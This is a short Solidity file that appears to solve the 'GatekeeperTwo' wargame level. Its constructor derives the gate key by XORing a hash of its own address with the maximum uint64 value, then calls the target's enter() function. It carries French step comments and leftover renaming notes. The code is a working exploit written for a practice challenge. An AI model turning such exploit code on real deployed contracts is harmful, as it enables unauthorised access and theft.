// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IGatekeeperTwo { // 1) change interface name
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperTwoAttack { // 2) change nameattck

    constructor(address target) {
        // étape 1 : calcul du hash
        bytes8 hash = bytes8(keccak256(abi.encodePacked(address(this))));
        
        // étape 2 : cast en uint64
        uint64 hash64 = uint64(hash);

        // étape 3 : XOR avec max uint64
        uint64 key = hash64 ^ type(uint64).max;

        // étape 4 : call
        IGatekeeperTwo(target).enter(bytes8(key));
    }
}